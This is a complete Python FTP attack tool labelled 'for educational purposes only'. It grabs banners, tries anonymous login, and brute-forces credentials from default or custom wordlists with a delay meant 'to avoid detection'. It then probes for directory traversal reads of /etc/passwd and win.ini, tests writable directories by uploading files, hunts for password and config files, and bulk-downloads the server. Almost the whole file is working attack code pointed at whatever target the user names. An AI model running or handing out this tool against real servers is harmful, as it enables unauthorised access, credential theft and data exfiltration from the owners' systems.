import ftplib
import socket
import sys
import argparse
from colorama import Fore, Style, init
import time
import os

# Initialize colorama
init(autoreset=True)

class FTPExploiter:
    def __init__(self, host, port=21, timeout=10, verbose=False):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.verbose = verbose
        self.ftp = None
        
    def print_info(self, message):
        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} {message}")
    
    def print_success(self, message):
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {message}")
    
    def print_warning(self, message):
        print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {message}")
    
    def print_error(self, message):
        print(f"{Fore.RED}[-]{Style.RESET_ALL} {message}")
    
    def banner(self):
        """Print banner"""
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}        FTP Exploitation & Enumeration Tool{Style.RESET_ALL}")
        print(f"{Fore.CYAN}        For Educational Purposes Only{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
    
    def test_connection(self):
        """Test if FTP server is reachable"""
        self.print_info(f"Testing connection to {self.host}:{self.port}...")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.host, self.port))
            sock.close()
            
            if result == 0:
                self.print_success(f"Port {self.port} is open")
                return True
            else:
                self.print_error(f"Port {self.port} is closed or filtered")
                return False
        except socket.gaierror:
            self.print_error(f"Could not resolve hostname: {self.host}")
            return False
        except Exception as e:
            self.print_error(f"Connection test failed: {e}")
            return False
    
    def get_banner(self):
        """Grab FTP banner"""
        self.print_info("Grabbing FTP banner...")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.host, self.port))
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            sock.close()
            
            self.print_success(f"Banner: {banner}")
            return banner
        except Exception as e:
            self.print_error(f"Failed to grab banner: {e}")
            return None
    
    def test_anonymous_login(self):
        """Test anonymous FTP login"""
        self.print_info("Testing anonymous login...")
        
        try:
            ftp = ftplib.FTP(timeout=self.timeout)
            ftp.connect(self.host, self.port)
            response = ftp.login('anonymous', 'anonymous@example.com')
            
            if '230' in response:
                self.print_success("Anonymous login successful!")
                self.print_success(f"Welcome message: {ftp.getwelcome()}")
                return ftp
            else:
                self.print_warning(f"Anonymous login response: {response}")
                ftp.quit()
                return None
        except ftplib.error_perm as e:
            self.print_error(f"Anonymous login denied: {e}")
            return None
        except Exception as e:
            self.print_error(f"Anonymous login failed: {e}")
            return None
    
    def brute_force_login(self, usernames_file=None, passwords_file=None):
        """Brute force FTP login"""
        self.print_info("Starting brute force attack...")
        
        # Default credentials
        default_users = ['admin', 'root', 'user', 'test', 'ftp', 'ftpuser', 'guest']
        default_passwords = ['admin', 'password', '123456', 'root', 'toor', 'test', 
                           'guest', 'ftp', '', 'admin123', 'password123']
        
        usernames = default_users
        passwords = default_passwords
        
        if usernames_file:
            try:
                with open(usernames_file, 'r') as f:
                    usernames = [line.strip() for line in f if line.strip()]
            except:
                self.print_warning(f"Could not read {usernames_file}, using defaults")
        
        if passwords_file:
            try:
                with open(passwords_file, 'r') as f:
                    passwords = [line.strip() for line in f if line.strip()]
            except:
                self.print_warning(f"Could not read {passwords_file}, using defaults")
        
        self.print_info(f"Testing {len(usernames)} usernames with {len(passwords)} passwords...")
        
        for username in usernames:
            for password in passwords:
                try:
                    ftp = ftplib.FTP(timeout=5)
                    ftp.connect(self.host, self.port)
                    response = ftp.login(username, password)
                    
                    if '230' in response:
                        self.print_success(f"Valid credentials found: {username}:{password}")
                        return ftp, username, password
                    
                    ftp.quit()
                except ftplib.error_perm:
                    if self.verbose:
                        print(f"\r{Fore.YELLOW}[!]{Style.RESET_ALL} Trying: {username}:{password}", end='')
                except Exception as e:
                    if self.verbose:
                        self.print_warning(f"Error with {username}:{password} - {e}")
                
                time.sleep(0.1)  # Small delay to avoid detection
        
        print()  # New line after brute force
        self.print_error("No valid credentials found")
        return None, None, None
    
    def list_files(self, ftp):
        """List files and directories"""
        self.print_info("Listing files and directories...")
        
        try:
            current_dir = ftp.pwd()
            self.print_success(f"Current directory: {current_dir}")
            
            files = []
            ftp.retrlines('LIST', files.append)
            
            if files:
                print(f"\n{Fore.CYAN}Files and Directories:{Style.RESET_ALL}")
                print("-" * 70)
                for item in files:
                    print(f"  {item}")
                print("-" * 70)
            else:
                self.print_warning("No files found")
            
            return files
        except Exception as e:
            self.print_error(f"Failed to list files: {e}")
            return []
    
    def recursive_list(self, ftp, path='.', level=0, max_depth=3):
        """Recursively list all files and directories"""
        if level > max_depth:
            return
        
        try:
            items = []
            ftp.retrlines(f'LIST {path}', items.append)
            
            for item in items:
                parts = item.split()
                if len(parts) < 9:
                    continue
                
                permissions = parts[0]
                name = ' '.join(parts[8:])
                
                indent = "  " * level
                
                if permissions.startswith('d'):
                    print(f"{indent}📁 {name}/")
                    new_path = f"{path}/{name}" if path != '.' else name
                    self.recursive_list(ftp, new_path, level + 1, max_depth)
                else:
                    size = parts[4]
                    print(f"{indent}📄 {name} ({size} bytes)")
        except Exception as e:
            if self.verbose:
                self.print_warning(f"Error listing {path}: {e}")
    
    def download_file(self, ftp, filename, local_path=None):
        """Download a file from FTP"""
        if local_path is None:
            local_path = filename
        
        self.print_info(f"Downloading {filename}...")
        
        try:
            with open(local_path, 'wb') as f:
                ftp.retrbinary(f'RETR {filename}', f.write)
            
            self.print_success(f"Downloaded to {local_path}")
            return True
        except Exception as e:
            self.print_error(f"Download failed: {e}")
            return False
    
    def download_all_files(self, ftp, local_dir='ftp_downloads'):
        """Download all files from FTP server"""
        self.print_info(f"Downloading all files to {local_dir}...")
        
        if not os.path.exists(local_dir):
            os.makedirs(local_dir)
        
        try:
            self._recursive_download(ftp, '.', local_dir)
            self.print_success(f"All files downloaded to {local_dir}")
        except Exception as e:
            self.print_error(f"Bulk download failed: {e}")
    
    def _recursive_download(self, ftp, remote_dir, local_dir):
        """Helper function for recursive download"""
        try:
            items = []
            ftp.retrlines(f'LIST {remote_dir}', items.append)
            
            for item in items:
                parts = item.split()
                if len(parts) < 9:
                    continue
                
                permissions = parts[0]
                name = ' '.join(parts[8:])
                
                if name in ['.', '..']:
                    continue
                
                if permissions.startswith('d'):
                    # Directory
                    new_remote_dir = f"{remote_dir}/{name}" if remote_dir != '.' else name
                    new_local_dir = os.path.join(local_dir, name)
                    
                    if not os.path.exists(new_local_dir):
                        os.makedirs(new_local_dir)
                    
                    self._recursive_download(ftp, new_remote_dir, new_local_dir)
                else:
                    # File
                    remote_file = f"{remote_dir}/{name}" if remote_dir != '.' else name
                    local_file = os.path.join(local_dir, name)
                    
                    try:
                        with open(local_file, 'wb') as f:
                            ftp.retrbinary(f'RETR {remote_file}', f.write)
                        print(f"  {Fore.GREEN}✓{Style.RESET_ALL} Downloaded: {remote_file}")
                    except Exception as e:
                        print(f"  {Fore.RED}✗{Style.RESET_ALL} Failed: {remote_file} - {e}")
        except Exception as e:
            if self.verbose:
                self.print_warning(f"Error in recursive download: {e}")
    
    def upload_file(self, ftp, local_file, remote_file=None):
        """Upload a file to FTP server"""
        if remote_file is None:
            remote_file = os.path.basename(local_file)
        
        self.print_info(f"Uploading {local_file} to {remote_file}...")
        
        try:
            with open(local_file, 'rb') as f:
                ftp.storbinary(f'STOR {remote_file}', f)
            
            self.print_success(f"Uploaded successfully")
            return True
        except Exception as e:
            self.print_error(f"Upload failed: {e}")
            return False
    
    def search_files(self, ftp, pattern):
        """Search for files matching pattern"""
        self.print_info(f"Searching for files matching: {pattern}")
        
        matches = []
        self._recursive_search(ftp, '.', pattern, matches)
        
        if matches:
            self.print_success(f"Found {len(matches)} matching files:")
            for match in matches:
                print(f"  {Fore.GREEN}•{Style.RESET_ALL} {match}")
        else:
            self.print_warning("No matching files found")
        
        return matches
    
    def _recursive_search(self, ftp, path, pattern, matches):
        """Helper function for recursive search"""
        try:
            items = []
            ftp.retrlines(f'LIST {path}', items.append)
            
            for item in items:
                parts = item.split()
                if len(parts) < 9:
                    continue
                
                permissions = parts[0]
                name = ' '.join(parts[8:])
                
                if name in ['.', '..']:
                    continue
                
                full_path = f"{path}/{name}" if path != '.' else name
                
                if permissions.startswith('d'):
                    self._recursive_search(ftp, full_path, pattern, matches)
                else:
                    if pattern.lower() in name.lower():
                        matches.append(full_path)
        except:
            pass
    
    def exploit_directory_traversal(self, ftp):
        """Test for directory traversal vulnerability"""
        self.print_info("Testing directory traversal...")
        
        traversal_paths = [
            '../../../etc/passwd',
            '../../../../etc/passwd',
            '../../../../../etc/passwd',
            '../../windows/win.ini',
            '../../../windows/win.ini',
        ]
        
        for path in traversal_paths:
            try:
                content = []
                ftp.retrlines(f'RETR {path}', content.append)
                
                if content:
                    self.print_success(f"Directory traversal found: {path}")
                    print(f"{Fore.YELLOW}Content preview:{Style.RESET_ALL}")
                    for line in content[:10]:
                        print(f"  {line}")
                    return True
            except:
                pass
        
        self.print_info("No directory traversal vulnerability found")
        return False
    
    def check_writable_directories(self, ftp):
        """Check for writable directories"""
        self.print_info("Checking for writable directories...")
        
        test_file = '.test_write_' + str(int(time.time()))
        writable_dirs = []
        
        self._check_writable_recursive(ftp, '.', test_file, writable_dirs)
        
        if writable_dirs:
            self.print_warning(f"Found {len(writable_dirs)} writable directories:")
            for directory in writable_dirs:
                print(f"  {Fore.RED}⚠{Style.RESET_ALL} {directory}")
        else:
            self.print_info("No writable directories found")
        
        return writable_dirs
    
    def _check_writable_recursive(self, ftp, path, test_file, writable_dirs, depth=0, max_depth=3):
        """Helper function to check writable directories"""
        if depth > max_depth:
            return
        
        try:
            # Try to create a test file
            test_content = b'test'
            from io import BytesIO
            
            ftp.cwd(path if path != '.' else '/')
            ftp.storbinary(f'STOR {test_file}', BytesIO(test_content))
            
            # If successful, directory is writable
            writable_dirs.append(ftp.pwd())
            
            # Clean up
            try:
                ftp.delete(test_file)
            except:
                pass
        except:
            pass
        
        # Check subdirectories
        try:
            items = []
            ftp.retrlines(f'LIST {path}', items.append)
            
            for item in items:
                parts = item.split()
                if len(parts) < 9:
                    continue
                
                permissions = parts[0]
                name = ' '.join(parts[8:])
                
                if permissions.startswith('d') and name not in ['.', '..']:
                    new_path = f"{path}/{name}" if path != '.' else name
                    self._check_writable_recursive(ftp, new_path, test_file, writable_dirs, depth + 1, max_depth)
        except:
            pass
    
    def full_exploitation(self):
        """Run full exploitation sequence"""
        self.banner()
        
        # Test connection
        if not self.test_connection():
            return
        
        # Get banner
        banner = self.get_banner()
        
        # Try anonymous login first
        ftp = self.test_anonymous_login()
        username = 'anonymous'
        password = 'anonymous@example.com'
        
        # If anonymous fails, try brute force
        if not ftp:
            ftp, username, password = self.brute_force_login()
        
        if not ftp:
            self.print_error("Could not authenticate to FTP server")
            return
        
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Successfully authenticated as: {username}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
        
        # List files
        self.list_files(ftp)
        
        # Recursive listing
        print(f"\n{Fore.CYAN}Complete Directory Structure:{Style.RESET_ALL}")
        print("-" * 70)
        self.recursive_list(ftp)
        print("-" * 70)
        
        # Check for writable directories
        print()
        self.check_writable_directories(ftp)
        
        # Test directory traversal
        print()
        self.exploit_directory_traversal(ftp)
        
        # Search for interesting files
        print()
        interesting_patterns = ['password', 'passwd', 'config', 'flag', '.txt', '.conf', '.ini']
        for pattern in interesting_patterns:
            matches = self.search_files(ftp, pattern)
            if matches:
                break
        
        # Ask if user wants to download all files
        print()
        choice = input(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Download all files? (y/n): ").lower()
        if choice == 'y':
            self.download_all_files(ftp)
        
        # Close connection
        try:
            ftp.quit()
        except:
            pass
        
        self.print_success("Exploitation complete!")


def main():
    parser = argparse.ArgumentParser(
        description='FTP Exploitation Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Full exploitation
  python ftp_exploit.py -t ftp.portlab.com
  
  # With custom port
  python ftp_exploit.py -t ftp.example.com -p 2121
  
  # Brute force with custom wordlists
  python ftp_exploit.py -t ftp.example.com -u users.txt -P passwords.txt
  
  # Verbose mode
  python ftp_exploit.py -t ftp.portlab.com -v
        """
    )
    
    parser.add_argument('-t', '--target', required=True, help='Target FTP server')
    parser.add_argument('-p', '--port', type=int, default=21, help='FTP port (default: 21)')
    parser.add_argument('-u', '--usernames', help='Usernames file for brute force')
    parser.add_argument('-P', '--passwords', help='Passwords file for brute force')
    parser.add_argument('--timeout', type=int, default=10, help='Timeout in seconds')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--anonymous-only', action='store_true', help='Only test anonymous login')
    
    args = parser.parse_args()
    
    exploiter = FTPExploiter(args.target, args.port, args.timeout, args.verbose)
    
    if args.anonymous_only:
        exploiter.test_anonymous_login()
    else:
        exploiter.full_exploitation()


if __name__ == "__main__":
    main()